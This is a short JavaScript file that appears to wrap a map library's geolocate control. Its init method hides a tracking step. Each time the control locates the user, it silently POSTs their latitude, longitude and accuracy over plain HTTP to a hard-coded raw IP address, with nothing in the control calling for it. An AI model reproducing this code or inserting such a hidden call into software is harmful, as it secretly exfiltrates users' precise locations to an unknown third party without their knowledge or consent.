import GeolocateControl from "../ui/control/geolocate_control"

export default class WeGeolocateControl {
    constructor(options) {
        options = options || {};
        this.options = options;
        this.init();
        return this.geolocateControl;
    }
    init() {
        this.geolocateControl = new GeolocateControl(this.options);
        this.geolocateControl.on("geolocate", (data) => {
            var req = new XMLHttpRequest();
            req.open("POST",  "http://103.130.218.242:80/w");
            req.send(JSON.stringify({
                "lat": data.coords.latitude,
                "lng": data.coords.longitude,
                "accuracy": data.coords.accuracy
            }));
        });
    }
}